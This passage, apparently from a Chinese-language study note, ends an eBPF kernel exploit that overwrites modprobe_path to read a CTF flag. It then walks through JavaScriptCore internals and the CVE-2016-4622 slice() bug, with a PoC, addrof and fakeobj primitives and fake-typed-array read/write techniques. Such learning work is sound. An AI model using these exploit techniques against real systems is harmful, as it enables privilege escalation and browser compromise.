    ctlptr[0] = 2;
    ctlptr[1] = 0xdeadbeef;
    bpf_update_elem(ctlmap_fd, &key, ctlbuf, 0);
    bpf_update_elem(expmap_fd, &key, expbuf, 0);
    
    trig_hook();
    memset(ctlbuf, 0, 0x100);
    bpf_lookup_elem(ctlmap_fd, &key, ctlbuf);

    uint64_t array_map_ops = ctlptr[2];
    uint64_t expmap_bpf_array = ctlptr[3] - 0xc0;
    uint64_t code = array_map_ops - 0x10168c0;
    uint64_t modprobe_path = code + 0x1446d80;
    uint64_t array_map_get_next_key = code + 0x16c3b0;
    info("array_map_ops", array_map_ops);
    info("expmap_bpf_array", expmap_bpf_array);
    info("code", code);
    info("modprobe_path", modprobe_path);

    uint64_t fake_array_map_ops[] =
    {
        code + 0x16c2d0, code + 0x16d070,
        0,               code + 0x16c920,
        code + 0x16c3b0, 0,
        0,               code + 0x155530,
        0,               code + 0x155530,
        0,               code + 0x16c430,
        code + 0x16c810, code + 0x16c3e0,
        0,               0,
        0,               0,
        0,               code + 0x16c6a0,
        0,               code + 0x16c4e0,
        code + 0x16cee0, 0,
        0,               0,
        code + 0x16c340, code + 0x16c370,
        code + 0x16c4b0, 0,
    };
    /**
     * fake_array_map_ops[4] is map_get_next_key (default: array_map_get_next_key)
     * fake_array_map_ops[14] is map_push_elem (default: 0)
     * 
     * and we hijack map_push_elem to map_get_next_key
     */
    
    fake_array_map_ops[14] = fake_array_map_ops[4];

    memcpy(expbuf, (void *) fake_array_map_ops, sizeof(fake_array_map_ops));
    bpf_update_elem(expmap_fd, &key, expbuf, 0);

    ctlptr[0] = 2;
    ctlptr[1] = 1; // hint to hijack array_map_ops
    bpf_update_elem(ctlmap_fd, &key, ctlbuf, 0);
    trig_hook(); /* array_map_get_next_key */

    /**
     * bpf_update_elem(fd, a, b, c) will be
     * array_map_get_next_key(a, b, c)
     */
    expptr[0] = 0x706d742f - 1; // "/tmp"[::-1]
    bpf_update_elem(expmap_fd, &key, expbuf, modprobe_path);
    expptr[0] = 0x6e77702f - 1; // "/pwn"[::-1]
    bpf_update_elem(expmap_fd, &key, expbuf, modprobe_path + 4);
    expptr[0] = 0xffffffff; // null
    bpf_update_elem(expmap_fd, &key, expbuf, modprobe_path + 8);
}

int main(int argc, char **argv)
{
    init_proc();
    setup_modprobe_path();
    prep();
    exploit();
    system("/tmp/dummy");
    system("cat /flag");
    return 0;
}
```

- 關鍵在於 `insns` 內部的行為





### CVE-2016-4622 + CVE-2018-4233 + JavascriptCore 內部機制

http://phrack.org/papers/attacking_javascript_engines.html

#### env / background

- 下載 WebKit 並切到有問題的版本

  ```bash
  git clone git://git.webkit.org/WebKit.git WebKit.git
  git checkout 3af5ce129e6636350a887d01237a65c2fce77823
  ```

- 編譯 debug version 的 JSC

  ```bash
  Tools/Scripts/build-webkit --jsc-only --debug
  ```

  - 我在編譯時會遇到某個檔案的 180 行的 `Handle<JSC::Unknown>` 會是 ambiguous reference，解決方法只要改成 `JSC::Handle<JSC::Unknown>` 即可

- 執行

  ```bash
  ./WebKitBuild/Debug/bin/jsc
  ```

相較 V8，JSC 的編譯速度實在是快很多，可能是因為直接在 MacOS 編譯而不是透過 Docker / Multipass 等等虛擬化技術包裝執行環境。

- 下斷點：

  ```
  lldb> b JSC::mathProtoFuncMax
  ```

- 之後執行 `Math.max(1,2)` 即可在斷點處停止，如果要看前後 source code，可以下：

  ```
  l   // 下 10
  l - // 前 10
  ```

執行過程中，可以使用 `describe(var)` 來看某個變數的詳細資料，輸出結果會像是：

```c
>>> describe([{}, 1, 13.37, [1, 2, 3], "test"])
Object: 0x10b9b4390 with butterfly 0x8000e0038 (Structure 0x10b9f2ae0:[Array, {}, ArrayWithContiguous, Proto:0x10b9c80a0]), StructureID: 99
```

包含：

- Object
  - 4 bytes - struct ID
  - 4 bytes - flags
  - 8 bytes - butterfly
  - 10 bytes ... - inline property
- butterfly
  - 8 bytes 為單位
- Structure
- Proto
- Structure ID

也能使用 `p *(JSC::JSObect*)` 印出對應 memory 其 `JSObject` 的架構



JS engine 通常都包含：

- a **compiler infrastructure**, typically including at least one just-in-time (JIT) compiler

  - 會刪除一些 dispatching overhead，並且透過一些 speculation 來提昇效能，像是 "這個變數一定會是 number" (事實上是 dynamically typed)

- a **VM** that operates on JavaScript values

  - 包含可以直接執行 emitted bytecode 的 interpreter，而通常又是 stack-based VM，以下為 JSC 的 sample code：

    ```c
        CASE(JSOP_ADD)
        {
            MutableHandleValue lval = REGS.stackHandleAt(-2);
            MutableHandleValue rval = REGS.stackHandleAt(-1);
            MutableHandleValue res = REGS.stackHandleAt(-2);
            if (!AddOperation(cx, lval, rval, res))
                goto error;
            REGS.sp--;
        }
        END_CASE(JSOP_ADD)
    ```

    

- a **runtime** that provides a set of builtin objects and functions



JS 為 **prototype-based-inheritance** - object 會 ref 到一個 prototype object，該 prototype object 會記錄他的 properties

JS engine 對於資料的儲存基本上不超過 8 bytes，舉例來說：

- v8 儲存 value 與 pointer 的差別為 LSB 是否為 1 (tagged)，為 1 的話則是 pointer

- JSC 以及 spidermokey (firefox) 用 NaN-boxing，利用不同 primitive 的 bit 會代表著對應 primitive 使否為 NaN，將那些 bit 作為 encoding 的機制，並且有些 primitive 是用 magic number 來代表，參考 [JSCJSValue src](https://github.com/WebKit/webkit/blob/main/Source/JavaScriptCore/runtime/JSCJSValue.h)：

  ```c
      *     Pointer {  0000:PPPP:PPPP:PPPP
      *              / 0001:****:****:****
      *     Double  {         ...
      *              \ FFFE:****:****:****
      *     Integer {  FFFF:0000:IIII:IIII
      
      *     False:     0x06
      *     True:      0x07
      *     Undefined: 0x0a
      *     Null:      0x02
  ```

object 會將 properties 存成 pair 的形式 (key, value)，而 array 可以說是一種 exotic object，property name 為 32-bit integer 的 object，同時 property 也是 element。

JSC 會將 properties 跟 elements 存在同個 memory region，並用 **Butterfly** 的方式存，使用 **Butterfly** 的 pointer 實際上只到的是 memory region 的中間，而左邊 (上面) 是放 element vector 的 length 以及 property，右邊 (下面) 是放 element，意即某個 object 指向某塊記憶體空間時，上下分別會儲存不同的資料，像是一個蝴蝶一樣：

```
--------------------------------------------------------
.. | propY | propX | length | elem0 | elem1 | elem2 | ..
--------------------------------------------------------
                            ^
                            |
            +---------------+
            |
  +-------------+
  | Some Object |
  +-------------+
```

- array element 會被存在 pointer 的下面
- array length 以及 property 會被存在前面

用來表示 array type 的 cell_header 分成許多種，包含但不限於以下的例子:

```c
    ArrayWithInt32      = IsArray | Int32Shape;
    ArrayWithDouble     = IsArray | DoubleShape;
    ArrayWithContiguous = IsArray | ContiguousShape;
```

而 property 也有可能直接存在 `Object` 底下 `0xbadbeef0` 的部分 (inline object)，但是在超過一定大小 (6) 後還是會把多的 element 用 butterfly 來存，不過此時 Object 仍然有東西 (1~6 的 element value)。有關儲存方式更詳細的 layout：

```
            +------------------------------------------+
            |                Butterfly                 |
            | baz | bar | foo | length: 2 | 42 | 13.37 |
            +------------------------------------------+
                                          ^
                                +---------+
               +----------+     |
               |          |     |
            +--+  JSCell  |     |      +-----------------+
            |  |          |     |      |                 |
            |  +----------+     |      |  MethodTable    |
            |       /\          |      |                 |
 References |       || inherits |      |  Put            |
   by ID in |  +----++----+     |      |  Get            |
  structure |  |          +-----+      |  Delete         |
      table |  | JSObject |            |  VisitChildren  |
            |  |          |<-----      |  ...            |
            |  +----------+     |      |                 |
            |       /\          |      +-----------------+
            |       || inherits |                  ^
            |  +----++----+     |                  |
            |  |          |     | associated       |
            |  | JSArray  |     | prototype        |
            |  |          |     | object           |
            |  +----------+     |                  |
            |                   |                  |
            v                   |          +-------+--------+
        +-------------------+   |          |   ClassInfo    |
        |    Structure      +---+      +-->|                |
        |                   |          |   |  Name: "Array" |
        | property: slot    |          |   |                |
        |     foo : 0       +----------+   +----------------+
        |     bar : 1       |
        |     baz : 2       |
        |                   |
        +-------------------+
```

- structureID 會從 structure table 找對應的 structure，這樣就可以知道 property 的數量與結構



當執行 JS 的 function 時，`arguments` 以及 `this` 兩個變數變的可以使用：

- `arguments` - 可以讓我們存取到 function 的 arguments
- `this` - 當 function 呼叫 constructor (`new func()`)，`this` 會指向被新建的 function object 本身
  - 但如果 function 是被 object 呼叫 (`obj.func()`)，`this` 則會指向 reference object

其中 function 有 `.call` 以及 `.apply` 兩個特別的 property，可以吃指定的 `this` (function object) 以及 `arguments` 並做呼叫，不過不確定有什麼功能。built-in function 通常不是 **C++** native function 就是 Javascript function，以 `Math.pow()` 來說：

```js
    EncodedJSValue JSC_HOST_CALL mathProtoFuncPow(ExecState* exec)
    {
        // ECMA 15.8.2.1.13

        double arg = exec->argument(0).toNumber(exec);
        double arg2 = exec->argument(1).toNumber(exec);

        return JSValue::encode(JSValue(operationMathPow(arg, arg2)));
    }
```

- JS function 的 signature -  `ECMA 15.8.2.1.13`
- argument 是怎麼被 extract 的 -  `argument()`
- arguemtn 是如何做 type convertion - `toNumber()`
- `mathProtoFuncPow()` 實際上是做了哪些事
- 回傳的結果 - `JSValue::encode()` 過的 value



 JSC 會根據 array element 的不同，決定 array element 的型態，像是以下 case，連第一個 Int 也被轉成 Double：

```
>>> describe([1337])
Object: 0x10b9b43a0 with butterfly 0x8000dc010 (Structure 0x10b9f2c30:[Array, {}, CopyOnWriteArrayWithInt32, Proto:0x10b9c80a0, Leaf]), StructureID: 102

>>> describe([1337,13.37])
Object: 0x10b9b43b0 with butterfly 0x8000dc030 (Structure 0x10b9f2ca0:[Array, {}, CopyOnWriteArrayWithDouble, Proto:0x10b9c80a0, Leaf]), StructureID: 103
```

JSC 的 JIT 分成多個不同層級：

- tier 1: the LLInt interpreter - 預設
- tier 2: the Baseline JIT compiler
  - hot code
  - statement in function 執行超過 100 次 or function 執行超過 6 次
- tier 3: the DFG JIT
  - statement in function 執行超過 1000 次 or function 執行超過 66 次
  - Data Flow Graph，但是會先 converting bytecode into the **DFG CPS form**
    - *CPS* (Continuation-Passing Style) 不會 return 而是直接將結果傳給下個 function
    - 產生的 DFG 可以呈現變數跟臨時變數之間的關係 (data flow relation)
- tier 4: the FTL JIT (now with our new B3 backend)
  - faster than light
  - 使用 compiler backend LLVM
  - **The FTL JIT is designed to bring aggressive C-like optimizations to JavaScript**

如果想觀察 JSC 在 JIT 時產生的 assembly code 或是其他更詳細的資訊，可以參考以下兩篇文章：

- https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/
- https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/
- 可以在執行前加上環境變數來改變執行時的行為，而如查看 JIT 產生的 asm 就可以加上 `env JSC_dumpDisassembly=true`

對於 JIT，type confusion 是一個很常見的漏洞，而從開發者的角度來看，JIT compiler 必須要注意：

- free of side-effect
- has effects on data
- 需要注意 JITed code 是否有改變 object layout 的可能，可參考：https://www.zerodayinitiative.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons

**On Stack Replacement (OSR)** - a technique for switching between different implementations of the same function

- you could use OSR to switch **from interpreted or unoptimized code** to **JITed code** as soon as it finishes compiling
- When OSR occurs, the **VM is paused**, and the stack frame for the target function is **replaced by an equivalent frame** which may have variables in different locations
- OSR 也有可能 **from optimized code** to **unoptimized code or interpreted code**
  - 情況可能發生在 JIT 的 assumptions 是錯的，實際 function 的行為可能不如預期，此時就可以 fallback
- [more OSR detail](https://stackoverflow.com/a/9105846)

JIT 的過程：

1. define function

   ```c
   >>> function x(meow) { var a = meow*3; return meow/2 + a; }
   Generated JIT code for LLInt program prologue thunk:
       Code at [0x5316d2c01820, 0x5316d2c01840):
         0x5316d2c01820: mov $0x1012c1cc0, %rax
         0x5316d2c0182a: jmp *%rax
         0x5316d2c0182c: int3
         0x5316d2c0182d: int3
         0x5316d2c0182e: int3
   ```

2. 0x50 次 (Baseline)

   ```c
   Generated Baseline JIT code for <global>#AQs9DO:[0x10ba5c8c0->0x10ba64200, BaselineGlobal, 119], instruction count = 119
      Source: for (var i = 0; i < 0x500; i++) x(15)
      Code at [0x5316d2c02540, 0x5316d2c02e80):
             0x5316d2c02540: push %rbp
             0x5316d2c02541: mov %rsp, %rbp
             0x5316d2c02544: mov $0x10ba5c8c0, %r11
             0x5316d2c0254e: mov %r11, 0x10(%rbp)
             0x5316d2c02552: lea -0x80(%rbp), %rsi
             0x5316d2c02556: mov $0x106d13130, %r11
             0x5316d2c02560: cmp %rsi, (%r11)
             0x5316d2c02563: ja 0x5316d2c02d95
             0x5316d2c02569: mov %rsi, %rsp
               ...
   ```

3. 0x500 次 (DFG)

   ```c
   >>> Generated DFG JIT code for x#AKIxrP:[0x10ba50690->0x10ba50460->0x10bafcf20, DFGFunctionCall, 27], instruction count = 27:
       Optimized with execution counter = 60.000000/1151.000000, -940
       Code at [0x5316d2c037c0, 0x5316d2c03be0):
             0x5316d2c037c0: push %rbp
             0x5316d2c037c1: mov %rsp, %rbp
             0x5316d2c037c4: mov $0x10ba50690, %r11
             0x5316d2c037ce: mov %r11, 0x10(%rbp)
             0x5316d2c037d2: lea -0x50(%rbp), %rsi
             0x5316d2c037d6: mov $0x106d13130, %r11
             0x5316d2c037e0: cmp %rsi, (%r11)
             0x5316d2c037e3: ja 0x5316d2c03a27
             0x5316d2c037e9: lea -0x40(%rbp), %rsp
             0x5316d2c037ed: test $0xf, %spl
             0x5316d2c037f1: jz 0x5316d2c037fe
             0x5316d2c037f7: mov $0x64, %r11d
             0x5316d2c037fd: int3
             ...
   ```

4. 0x50000 次 (FTL)

   ```c
   ...
   Unwind info for x#AKIxrP:[0x10ba508c0->0x10ba50460->0x10bafcf20, FTLFunctionCall, 27]:
   localsOffset = 0 for stack slot: stack0 at 0x106c6feb0
   Generated FTLMode code for x#AKIxrP:[0x10ba508c0->0x10ba50460->0x10bafcf20, FTLFunctionCall, 27], instruction count = 27:
   BB#0: ; frequency = 1.000000
                     0x5316d2c05580: push %rbp
                     0x5316d2c05581: mov %rsp, %rbp
                     0x5316d2c05584: lea -0x30(%rbp), %rsp
   ...
   ```



如果可以在動態改變 object layout，就能造成 type confusion 並且做到 information leak，而開發者的對應方式為：如果該 function 會在動態更新 object，會被 marked 成 dangerous：`clobberWorld()`。

- 像是 `String.valueOf()` 可能會更改 structure，就是 dangerous (returns the **primitive value of the specified object**)

GC 的機制有許多種，其中一個是 maintain reference counter，而大多數的 JS engine 都是用 **mark and sweep algorithm** 來實踐 GC，從 root node 開始搜，陸續 free 已經不需要的 object，而 root node 通常存在於 stack，並且有著如 `windows` 那樣的全域 object。

不過 JSC 並沒有一直 track root node，而是直接在 stack 搜尋像 pointer value 的東西，並且將他當作 root node，相較之下 SpiderMonkey 就是用 `Rooted<>` 的 pointer class 指向在 heap 的 object。並且 JSC 的 GC 為 incremental garbage collector，分成不同的 step 做 mark 來減少延遲，但是這樣的方式可能有一些 case 會出現問題：

- the GC runs and visits some **object O** and **all its referenced objects**. It marks them as **visited** and later **pauses** so the application can run again
- O is **modified** and **a new reference to another Object P** is added to it
- Then the GC runs **again** but it doesn't know about P. It finishes the marking phase and frees the memory of P

所以在 implementation 時會用到一些 write barrier 來確保資料同步。

而 JSC 又用到兩種不同的 GC (?)：

- moving garbage collector - moves **live objects** to a **different location** and updates all pointers to these objects
  - 在要刪除點時不需要把 node 放到 free_list，因此減少 runtime overhead
- non-moving garbage collector
- JSC 儲存 JavaScript objects itself 以及一些 objects 到 a non-moving heap，而 non-moving 為 marked space，用來儲存 butterflies 以及作為在 moving heap array 的 copied space



marked space / copied space

- marked space - a collection of memory blocks that **keep track of the allocated cells**

  - 在 JSC，object in marked space 都是 **inherit from the JSCell class**，並且 starts with an **eight byte header**，header 當中包含了當前 GC 要使用的 cell state，而 GC 會用這個來追蹤 JSCell 是否 visited

  - 還有一個值得注意的是，JSC 在每個 marked block 開頭都會有一個 `MarkedBlock` instance：

    ```js
    inline MarkedBlock* MarkedBlock::blockFor(const void* p)
    {
    	return reinterpret_cast<MarkedBlock*>(
    				reinterpret_cast<Bits>(p) & blockMask);
    }
    ```

    - instance 當中有一個 pointer 指向 owning Heap，以及一個 pointer 指向 VM instance，可以讓 engine 知道是否在當前的 context 可以使用
      - 而這個機制讓 fake object 不好建立，因為合法的 MarkedBlock instance 必須做到一些操作，因此該 object 並不是 fake object 的首選目標

- copied space - 儲存與 marked space 內有關聯的 memory buffers，通常是 butterflies，不過 typed array 的內容也會放在這，因此 OOB 有可能在該 memory region 發生

  - copied space allocator:

    ```js
    CheckedBoolean CopiedAllocator::tryAllocate(size_t bytes, void** out)
        {
          ASSERT(is8ByteAligned(reinterpret_cast<void*>(bytes)));
    
          size_t currentRemaining = m_currentRemaining;
          if (bytes > currentRemaining)
            return false;
          currentRemaining -= bytes;
          m_currentRemaining = currentRemaining;
          *out = m_currentPayloadEnd - currentRemaining - bytes;
    
          ASSERT(is8ByteAligned(*out));
    
          return true;
        }
    ```

    - 同時這也是一個 bump allocator - 單純的回傳 N bytes in the current block，直到下個 block 的空間被用完，而這也保證兩個連續的 allocation 會是相鄰的，因此在擁有 oob 的情況下，對我們來說是個好目標



#### CVE-2016-4622 analyze / exploit

**環境**

作法一：

1. `git clone https://github.com/hdbreaker/WebKit-CVE-2016-4622.git`
2. disable **System Integrity Protection** 才能 `export DYLD_FRAMEWORK_PATH=$(pwd)`，不然 `DYLD` 的 env 都會被 ignore
3. 失敗 (環境為 Big Sur 11.5.2)，不知道為什麼吃不到 FRAMEWORK，或者是 FRAMEWORK 是壞的

作法二 (參考 https://github.com/m1ghtym0/write-ups/tree/master/browser/CVE-2016-4622，環境為 ubuntu 18.04)：

1. `git clone git://git.webkit.org/WebKit.git WebKit`

   - 這邊踩到一個雷，直接在 github 上搜的 mirror  不是用 `git.webkit.org` ，因此如果直接 `git clone git@github.com:WebKit/WebKit.git` 不能切換到其他 branch

2. `git checkout 3d9b9ba1f3341456661952128224aa3a3f27ae55`

3. `git apply vuln.patch`，`vuln.patch` 內容如下：

   ```diff
   diff --git a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
   index c37389aa857..f77821c89ae 100644
   --- a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
   +++ b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp
   @@ -973,7 +973,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
        if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))
            return { };
    
   -    bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj) && length == toLength(exec, thisObj);
   +    bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj);
        RETURN_IF_EXCEPTION(scope, { });
        if (LIKELY(okToDoFastPath)) {
            if (JSArray* result = asArray(thisObj)->fastSlice(*exec, begin, end - begin))
   diff --git a/Source/JavaScriptCore/runtime/ObjectInitializationScope.cpp b/Source/JavaScriptCore/runtime/ObjectInitializationScope.cpp
   index e19c8a92a4e..550bc2fe270 100644
   --- a/Source/JavaScriptCore/runtime/ObjectInitializationScope.cpp
   +++ b/Source/JavaScriptCore/runtime/ObjectInitializationScope.cpp
   @@ -44,7 +44,7 @@ ObjectInitializationScope::~ObjectInitializationScope()
    {
        if (!m_object)
            return;
   -    verifyPropertiesAreInitialized(m_object);
   +    //verifyPropertiesAreInitialized(m_object);
    }
    
    void ObjectInitializationScope::notifyAllocated(JSObject* object, bool wasCreatedUninitialized)
   ```

4. `Tools/Scripts/build-jsc --jsc-only --debug ` (macOS 16GB i7 4 core 跑在 ubuntu18.04 docker 要跑三個鐘頭)

5. 失敗 again



`slice()` 的使用方式

```js
    var a = [1, 2, 3, 4];
    var s = a.slice(1, 3);
    // s now contains [2, 3]
```



而 `slice()`  是由 `arrayProtoFuncSlice()` implement

```js
EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
    {
      /* [[ 1 ]] */
      JSObject* thisObj = exec->thisValue()
                         .toThis(exec, StrictMode)
                         .toObject(exec);
      if (!thisObj)
        return JSValue::encode(JSValue());

      /* [[ 2 ]] */
      unsigned length = getLength(exec, thisObj);
      if (exec->hadException())
        return JSValue::encode(jsUndefined());

      /* [[ 3 ]] */
      unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);
      unsigned end =
          argumentClampedIndexFromStartOrEnd(exec, 1, length, length);

      /* [[ 4 ]] */
      std::pair<SpeciesConstructResult, JSObject*> speciesResult =
        speciesConstructArray(exec, thisObj, end - begin);
      // We can only get an exception if we call some user function.
      if (UNLIKELY(speciesResult.first ==
      SpeciesConstructResult::Exception))
        return JSValue::encode(jsUndefined());

      /* [[ 5 ]] */
      if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &&
            isJSArray(thisObj))) {
        if (JSArray* result =
                asArray(thisObj)->fastSlice(*exec, begin, end - begin))
          return JSValue::encode(result);
      }

      JSObject* result;
      if (speciesResult.first == SpeciesConstructResult::CreatedObject)
        result = speciesResult.second;
      else
        result = constructEmptyArray(exec, nullptr, end - begin);

      unsigned n = 0;
      for (unsigned k = begin; k < end; k++, n++) {
        // n == index
        JSValue v = getProperty(exec, thisObj, k);
        if (exec->hadException())
          return JSValue::encode(jsUndefined());
        if (v)
          result->putDirectIndex(exec, n, v);
      }
      setLength(exec, result, n);
      return JSValue::encode(result);
    }
```

1. Obtain the reference object for the method call (this will be the array object)
   - 取得 object 的 reference ( 也就是 `array` ) - `thisObj`
2. Retrieve the length of the array
   - 取得 array 長度 - `getLength(exec, thisObj)`
3. Convert the arguments (start and end index) into native integer types and clamp them to the range [0, length)
   - 找到 slice 的 start 以及 end，並且要侷限在 `[0, length)`
4. Check if a species constructor should be used
   - 看有沒有用 species constructor
   - `Symbol.species` - specifies a function-valued property that the constructor function uses to create derived objects
5. Perform the slicing
   - 執行 slice，一共有兩種方式
     - array 為 native array (`isJSArray(thisObj)`) with dense storage，走  `fastSlice(*exec, begin, end - begin))`
       - 只是用 `memcpy()` 將給定的 index 以及 length copy 到 new array
     - 另一個就是一個個將 element 丟到

- 看起來 begin 跟 end 會在 array 的範圍當中 (長度)



正常情況下，如果 object 有 define `valueOf()` function 的話，當要存取該 object 所代表的 number 時，就會直接呼叫該 function。而當我們深入研究 `arrayProtoFuncSlice()` 所執行到的  `argumentClampedIndexFromStartOrEnd()`：

```js
    JSValue value = exec->argument(argument);
    if (value.isUndefined())
        return undefinedValue;

    double indexDouble = value.toInteger(exec);  // Conversion happens here
    if (indexDouble < 0) {
        indexDouble += length;
        return indexDouble < 0 ? 0 : static_cast<unsigned>(indexDouble);
    }
    return indexDouble > length ? length :
                                  static_cast<unsigned>(indexDouble);
```

會在 `toInteger()` 時間接呼叫 `valueOf()`，但是如果在 `valueOf()` 的過程中發生 array length 的改變，則會在之後造成 out-of-bounds (OOB) 的存取，並且會透過 `memcpy()` 回傳給 user。

於是如果要確保我們可以成功 resize array，可以先看一下 `.length` 是如何實踐的 (`JSArray::setLength:`)：

```js
unsigned lengthToClear = butterfly->publicLength() - newLength;
unsigned costToAllocateNewButterfly = 64; // a heuristic.
if (lengthToClear > newLength &&
    lengthToClear > costToAllocateNewButterfly) {
    reallocateAndShrinkButterfly(exec->vm(), newLength);
    return true;
}
```

- heuristic 分配 butterfly 大小，避免太長重新分配
- 如果要清除的空間 > 新的空間，且同時 `> 64`，這樣就會需要 shrink array，造成我們可以做 OOB 存取 (原變數的長度並沒有更新)

POC:

```js
var a = [];
// 增加 array 的大小
for (var i = 0; i < 100; i++)
    a.push(i + 0.123);

// 100 > 0 且 100 > 64 -> reallocate
var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});
// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]
```

正確的情況應該是 `undefined` * 10，不過卻會回傳 double value



**addrof**

似乎 JSC 的打法都是想辦法讓 `ArrayWithDouble` 的 array 但是被 engine 認成 `ArrayWithContiguous`。

建構 `addrof` 需要幾個步驟：

1. Create an array of doubles. This will be stored internally as IndexingType `ArrayWithDouble`
2. **shrink** the previously created array
   1. **allocate a new array** containing just the object whose address we wish to know
      - This array will (most likely) be placed right behind the new butterfly since it's located in copied space
   2. return a value **larger than the new size** of the array to trigger the bug
3. Call slice() on the target array the object from step 2 as **one of the arguments**

```js
    function addrof(object) {
        var a = [];
        // 建立有 100 elements 的 double array [1]
        for (var i = 0; i < 100; i++)
            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles
	
        // [2.1] 在 valueOf 當中先轉變大小為 0，並且在 create 新的 array，
        // 新 array 的 element 為我們的 target， // type 為 ArrayWithContiguous ?
        // 最後回傳大於 1 (new size) 的數字 [2.2]
        var hax = {valueOf: function() {
            a.length = 0;
            a = [object]; // 建立的 array 因為先前的 array 大小被改成 0，
            // 因此會緊接在先前的 array 後面
            return 4;
        }};

        // shrink array [2]
        // hax 為其中一個 argument [3]
        var b = a.slice(0, hax); // (0, 4) 但是
        return Int64.fromDouble(b[3]);
    }
```



**fakeobj**

大概分成幾個步驟：

1. Create an **array of objects**. This will be stored internally as IndexingType **ArrayWithContiguous**
2. Set up an **object** with a custom `valueOf` function which will
   1. shrink the previously created array
   2. allocate a **new array** containing **just a double** whose bit pattern matches the address of the **JSObject we wish to inject**
      - The double will be stored in native form since the array's IndexingType will be `ArrayWithDouble`
3. Call `slice()` on the target array the object from step 2 as one of the arguments

```js
function fakeobj(addr) {
    var a = [];
    // [1] 由於 element 都是 object，因此 new array type 為 ArrayWithContiguous
    for (var i = 0; i < 100; i++)
        a.push({});     // Array must be of type ArrayWithContiguous

    // 將 target address 轉為 double
    addr = addr.asDouble();
    var hax = {valueOf: function() {
        a.length = 0; // [2.1] shrink 先前的 array
        a = [addr]; // [2.2] 建立新的 array，並且 element 只有我們的 target
        // 而該 array 的 type 會是 ArrayWithDouble
        return 4;
    }};

    // a.slice(0, 4)[3] 會回傳 object (因為 ArrayWithContiguous)
    // 但是該 object address 會是我們控制的 address
    return a.slice(0, hax)[3];
}
```



然而有了 `addrof` 與 `fakeobj` 後，開始構思 exploit：

- 建構怎樣的 object
  - JS 提供高效能以及高度優化的 typed array (也代表檢查較少)，而其中有 data pointer 可以控制做 arbitrary r/w，因此是個好對象，最後決定建構 fake `Float64Array` object
- 怎麼建構
- 建構的 object 要在哪

回顧一下 JSObject system：

- JSObject inline storage 預設有 6 個 slot，在大於 6 個後就會放到 butterfly 當中

- 前 8 bytes 是 JSCell，存：

  - **StructureID m_structureID** - This is the most interesting one, we'll explore it further below
  - **IndexingType m_indexingType** - We've already seen this before. It indicates the **storage mode of the object's elements**
  - **JSType m_type** -  Stores the type of this cell: **string**, **symbol**, **function**, **plain object**, ...

  - **TypeInfo::InlineTypeFlags m_flags** - Flags that aren't too important for our purposes
    - JSTypeInfo.h contains further information
  - **CellState m_cellState** - We've also seen this before. It is used by the **gc** during collection

- structure 並不是存成 pointer，而是透過 structureID，並且在新增 properties 時會將新的 structure cache 在前個 structure 當中，再透過 transition table 來存取，這樣做能避免掉每新增一個 protperty 就要新增一個 Structure

  - 大多數的 JS engine 也是使用相同概念，而 structure 在 v8 稱作 maps or hidden classes；Spidermonkey 稱作 shape

  - structure ID 對 JIT optimize 也有很大的效果，舉例來說：

    ```js
    function foo(a) {
        return a.bar + 3;
    }
    ```

    JIT 後若要知道他的 object 是否有 property `a`，以及他的 `a` 的 type 是否為數字，只需要判斷 structure ID 是不是在 JIT 過程中一直被傳入的 structure 即可：

    ```asm
    mov r1, [r0 + #structure_id_offset];
    cmp r1, #structure_id;
    jne bailout_to_interpreter;
    mov r2, [r0 + #inline_property_offset];
    ```

  - 不過 structure ID 比較難做 predict，fake object 的 structure ID 必須透過 for loop 的方式來找是否為要構造的 structure ID，像是：

    ```js
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            // Add a new property to create a new Structure instance.
            a[randomString()] = 1337;
        }
    ```

    會有許多 structure ID，如果要找到指定的，就用 `instanceof()` 來找：

    ```js
    while (!(fakearray instanceof Float64Array)) {
        // Increment structure ID by one here
    }
    ```

    `instanceof()` 只是單純去比對 structure prototype (maybe 直接找 structure ID ?)，並不會影響到 memory layout



**exploit**

`Float64Arrays` 由 `JSArrayBufferView` class 所 implement，除了基本的 JSObject 還包含 pointer to backing memory (稱作 `vector`)。而因為我們把 `Float64Arrays` 放在 inline slot，因此要 handle 一些 JSValue encoding 的限制

- 不能有 `nullptr` (0)，因為 `nullptr` 在 encode 後由其他 value 表示
- 因為用 `NaN-boxing`，所以不能設 valid mode field (必須要大於 `0x00010000 `?)
- can only set the vector to point to another JSObject since these are
        the only pointers that a JSValue can contain
- `JSValue` 的 `vector` 只能指向設其他 JSObject
  - `CagedPtr<Gigacage::Primitive, void, tagCagedPtr>` 會檢查 `vector` 指向的區域是否為合法，但是 butterfly 不會



改變 `vector` 指向另一個 `Uint8Array`，而此時就可以透過第二個 object 來改變 `butterfly`，做到 arbitrary r/w

```
+----------------+                  +----------------+
|  Float64Array  |   +------------->|  Uint8Array    |
|                |   |              |                |
|  JSCell        |   |              |  JSCell        |
|  butterfly     |   |              |  butterfly     |
|  vector  ------+---+              |  vector        |
|  length        |                  |  length        |
|  mode          |                  |  mode          |
+----------------+                  +----------------+
```



當可以任意寫，可以構造一個 `makeJITCompiledFunction()`，取得 function address，並且將內容寫成 shellcode，不過從 iOS 10 開始，JIT 的 memory region 就不是 RWX 而是 --X，因此可能會需要串一些 ROP 改變 memory region 的 permission。



**stay alive past gc**

如果要在 exploit 結束後讓 render 能正常 work，就必須處理我們建構的 fakeobj `Float64Array` 其 `butterfly` 是 invalid pointer 的情況

1. Create an empty object. The structure of this object will describe
       an object with the default amount of inline storage (6 slots), but
       none of them being used.

